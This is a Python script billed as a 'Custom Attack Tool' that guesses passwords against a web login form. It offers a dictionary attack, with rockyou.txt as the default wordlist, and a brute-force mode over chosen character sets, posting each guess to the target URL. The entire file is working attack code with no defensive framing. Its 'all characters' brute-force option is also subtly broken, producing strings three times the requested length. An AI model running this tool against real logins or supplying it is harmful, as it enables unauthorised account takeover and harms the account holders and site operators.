#!/usr/bin/env python3
import argparse
import string
import itertools
import os
import requests

def dictionary_attack(url, username, wordlist_path):
    with open(wordlist_path, "r", encoding="latin-1") as wordlist_file:
        for line in wordlist_file:
            current_password = line.strip()
            payload = {
                "username": username,
                "password": current_password
            }
            response = requests.post(url, data=payload)
            print(f"Trying password: {current_password}")
            if "Login successful" in response.text:
                return current_password
    return None

def brute_force_attack(url, username, character_sets, min_length, max_length):
    for length in range(min_length, max_length + 1):
        for characters in itertools.product(*character_sets, repeat=length):
            current_password = ''.join(characters)
            payload = {
                "username": username,
                "password": current_password
            }
            response = requests.post(url, data=payload)
            print(f"Trying password: {current_password}")
            if "Login successful" in response.text:
                return current_password
    return None

def main():
    parser = argparse.ArgumentParser(description="Custom Attack Tool")
    parser.add_argument("-url", required=True, help="Target URL")
    parser.add_argument("-u", "--username", required=True, help="Username")
    args = parser.parse_args()

    print("Select an attack type:")
    print("1. Dictionary Attack")
    print("2. Brute-Force Attack")

    attack_type = input("Enter the number of your choice: ")

    if attack_type == "1":
        wordlist_path = input("Enter the path to the wordlist file (leave empty for default): ")
        if not wordlist_path:
            wordlist_path = "/usr/share/wordlists/rockyou.txt"
        password = dictionary_attack(args.url, args.username, wordlist_path)
    elif attack_type == "2":
        print("Select password complexity:")
        print("1. Letters (lowercase)")
        print("2. Letters (uppercase)")
        print("3. Letters (both cases)")
        print("4. Digits")
        print("5. Special characters")
        print("6. All characters (letters, digits, special)")
        
        complexity_choice = input("Enter the number of your choice: ")
        
        character_sets = []
        if complexity_choice == "1":
            character_sets.append(string.ascii_lowercase)
        elif complexity_choice == "2":
            character_sets.append(string.ascii_uppercase)
        elif complexity_choice == "3":
            character_sets.append(string.ascii_letters)
        elif complexity_choice == "4":
            character_sets.append(string.digits)
        elif complexity_choice == "5":
            character_sets.append(string.punctuation)
        elif complexity_choice == "6":
            character_sets = [string.ascii_letters, string.digits, string.punctuation]
        else:
            print("Invalid choice.")
            return
        
        min_length = int(input("Enter the minimum password length: "))
        max_length = int(input("Enter the maximum password length: "))
        
        password = brute_force_attack(args.url, args.username, character_sets, min_length, max_length)
    else:
        print("Invalid choice.")
        return

    if password:
        print(f"SUCCESS! Password found: {password}")
    else:
        print("Password not found.")

if __name__ == "__main__":
    main()
